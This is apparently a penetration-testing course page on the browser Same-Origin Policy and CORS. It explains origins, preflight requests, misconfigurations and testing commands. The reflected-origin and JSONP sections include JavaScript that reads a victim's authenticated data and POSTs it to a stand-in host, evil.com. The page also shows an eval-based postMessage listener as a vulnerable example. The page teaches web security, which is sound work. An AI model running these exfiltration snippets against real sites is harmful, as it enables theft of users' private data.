# Same-Origin Policy

## Unit 1: Web Application Fundamentals — Topic 7

## 🎯 Overview

The Same-Origin Policy (SOP) is the most fundamental security mechanism in web browsers. It restricts how a document or script from one origin can interact with resources from another origin. Understanding SOP is essential for penetration testing because most web attacks (XSS, CSRF, CORS abuse) involve bypassing or exploiting weaknesses in origin controls.

---

## 1. What is an Origin?

```
┌──────────────────────────────────────────────────────────────┐
│                    ORIGIN = SCHEME + HOST + PORT              │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  https://www.example.com:443/path/page.html                  │
│  ──────   ───────────────  ───  ──────────────               │
│  Scheme   Host             Port Path (not part               │
│                                  of origin)                   │
│                                                              │
│  Origin: https://www.example.com:443                         │
└──────────────────────────────────────────────────────────────┘
```

### Same vs Different Origin

| URL | Same Origin as `https://www.example.com`? | Reason |
|-----|------------------------------------------|--------|
| `https://www.example.com/page2` | ✅ Yes | Same scheme, host, port |
| `https://www.example.com:443/api` | ✅ Yes | Port 443 is default for HTTPS |
| `http://www.example.com` | ❌ No | Different scheme (http vs https) |
| `https://api.example.com` | ❌ No | Different host (subdomain) |
| `https://www.example.com:8080` | ❌ No | Different port |
| `https://example.com` | ❌ No | Different host (no www) |

---

## 2. What SOP Restricts

```
┌──────────────────────────────────────────────────────────────┐
│               SAME-ORIGIN POLICY RESTRICTIONS                 │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Site A (https://a.com)         Site B (https://b.com)       │
│  ┌─────────────────────┐       ┌─────────────────────┐      │
│  │  JavaScript on A    │       │  Resources on B     │      │
│  │                     │       │                     │      │
│  │  ✗ Read B's DOM     │  ──→  │  DOM content        │      │
│  │  ✗ Read B's cookies │  ──→  │  Cookies            │      │
│  │  ✗ Read B's AJAX    │  ──→  │  API responses      │      │
│  │  ✗ Read B's storage │  ──→  │  LocalStorage       │      │
│  │                     │       │                     │      │
│  │  ✓ Load B's images  │  ──→  │  <img src>          │      │
│  │  ✓ Load B's scripts │  ──→  │  <script src>       │      │
│  │  ✓ Load B's CSS     │  ──→  │  <link href>        │      │
│  │  ✓ Submit forms to B│  ──→  │  <form action>      │      │
│  └─────────────────────┘       └─────────────────────┘      │
└──────────────────────────────────────────────────────────────┘
```

### Key SOP Rules

| Action | Allowed Cross-Origin? |
|--------|----------------------|
| Read DOM of other origin | ❌ Blocked |
| Read cookies of other origin | ❌ Blocked |
| Read AJAX/fetch response | ❌ Blocked (unless CORS allows) |
| Send AJAX/fetch request | ✅ Sent (but response blocked) |
| Embed images (`<img>`) | ✅ Allowed |
| Embed scripts (`<script>`) | ✅ Allowed (and executed!) |
| Embed styles (`<link>`) | ✅ Allowed |
| Submit forms (`<form>`) | ✅ Allowed (CSRF risk!) |
| Embed iframes | ✅ Allowed (but can't read content) |

---

## 3. CORS — Cross-Origin Resource Sharing

CORS is the controlled mechanism for relaxing SOP when cross-origin access is needed.

```
┌──────────────────────────────────────────────────────────────┐
│                    CORS FLOW                                  │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Browser (on a.com)                    Server (b.com)        │
│  │                                         │                 │
│  │  fetch("https://b.com/api/data")       │                 │
│  │                                         │                 │
│  │──── Origin: https://a.com ────────────→│                 │
│  │                                         │                 │
│  │←── Access-Control-Allow-Origin: ──────│                 │
│  │    https://a.com                        │                 │
│  │                                         │                 │
│  │  Browser: Origin matches? → Allow read  │                 │
│  │  Browser: No match? → Block response    │                 │
└──────────────────────────────────────────────────────────────┘
```

### CORS Preflight (Complex Requests)

```
Browser                                    Server
  │                                           │
  │  OPTIONS /api/data HTTP/1.1               │
  │  Origin: https://a.com                    │
  │  Access-Control-Request-Method: PUT       │
  │  Access-Control-Request-Headers: X-Auth   │
  │────────────────────────────────────────→  │
  │                                           │
  │  HTTP/1.1 204 No Content                  │
  │  Access-Control-Allow-Origin: https://a.com
  │  Access-Control-Allow-Methods: GET, PUT   │
  │  Access-Control-Allow-Headers: X-Auth     │
  │  Access-Control-Max-Age: 86400            │
  │←────────────────────────────────────────  │
  │                                           │
  │  PUT /api/data HTTP/1.1                   │
  │  Origin: https://a.com                    │
  │  X-Auth: token123                         │
  │────────────────────────────────────────→  │
  │                                           │
  │  HTTP/1.1 200 OK                          │
  │  Access-Control-Allow-Origin: https://a.com
  │←────────────────────────────────────────  │
```

---

## 4. CORS Misconfigurations (Attack Surface)

### Reflected Origin

```bash
# Test: Send arbitrary Origin header
curl -sI https://target.com/api/data \
  -H "Origin: https://evil.com" | grep -i access-control

# Vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true

# Attack: evil.com can read authenticated data!
```

```javascript
// Exploit from attacker's site
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  // Send stolen data to attacker
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

### Null Origin Bypass

```bash
# Some servers allow null origin
curl -sI https://target.com/api/data \
  -H "Origin: null" | grep -i access-control

# Access-Control-Allow-Origin: null  ← Vulnerable!

# Exploit: Sandboxed iframes send null origin
# <iframe sandbox="allow-scripts" src="data:text/html,...">
```

### Wildcard with Credentials

```http
# Dangerous misconfiguration (browsers block this combo):
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# Browsers reject this, but server-side code might not
```

---

## 5. SOP Bypass Techniques

### JSONP (Legacy Bypass)

```javascript
// JSONP wraps data in a callback function
// <script src="https://api.target.com/data?callback=steal">
// Response: steal({"user":"admin","email":"admin@corp.com"})

// The data is executed as JavaScript on attacker's page
function steal(data) {
  fetch('https://evil.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  });
}
```

### PostMessage Vulnerabilities

```javascript
// Insecure postMessage listener (no origin check)
window.addEventListener('message', function(e) {
  // VULNERABLE: no origin validation
  eval(e.data);  // Attacker can send malicious code
});

// Secure implementation
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  // Process message safely
});
```

### WebSocket Cross-Origin

```javascript
// WebSockets are NOT restricted by SOP
// Browser sends Origin header but server must validate
var ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(e) {
  // Attacker can read WebSocket data cross-origin
  // if server doesn't validate Origin header
};
```

---

## 6. Testing SOP and CORS

```bash
# 1. Test reflected origin
curl -H "Origin: https://evil.com" -sI \
  https://target.com/api/ | grep Access-Control

# 2. Test null origin
curl -H "Origin: null" -sI \
  https://target.com/api/ | grep Access-Control

# 3. Test subdomain trust
curl -H "Origin: https://sub.target.com" -sI \
  https://target.com/api/ | grep Access-Control

# 4. Test with credentials
curl -H "Origin: https://evil.com" -sI \
  https://target.com/api/ | grep -i "allow-credentials"

# 5. Check for JSONP endpoints
curl "https://target.com/api/data?callback=test"
curl "https://target.com/api/data?jsonp=test"

# 6. Automated CORS testing
# Use tools like CORScanner or Burp Suite
```

---

## 📊 Summary Table

| Mechanism | Purpose | Attack if Misconfigured |
|-----------|---------|------------------------|
| SOP | Isolate origins | XSS bypasses SOP entirely |
| CORS | Controlled cross-origin | Data theft from authenticated APIs |
| JSONP | Legacy cross-origin | Data theft via callback |
| PostMessage | Cross-frame communication | Code injection, data theft |
| WebSocket | Full-duplex communication | Cross-origin data access |
| CSP | Script source control | Complements SOP (defense-in-depth) |

---

## ❓ Revision Questions

1. What three components define an origin?
2. Why can forms submit cross-origin but AJAX cannot read responses?
3. How does a reflected CORS origin misconfiguration enable data theft?
4. What is a CORS preflight request and when is it triggered?
5. How can JSONP endpoints be exploited by attackers?
6. Why is `Access-Control-Allow-Origin: *` with credentials dangerous?

---

*Previous: [06-cookies-and-sessions.md](06-cookies-and-sessions.md)*

---

*[Back to README](../README.md)*
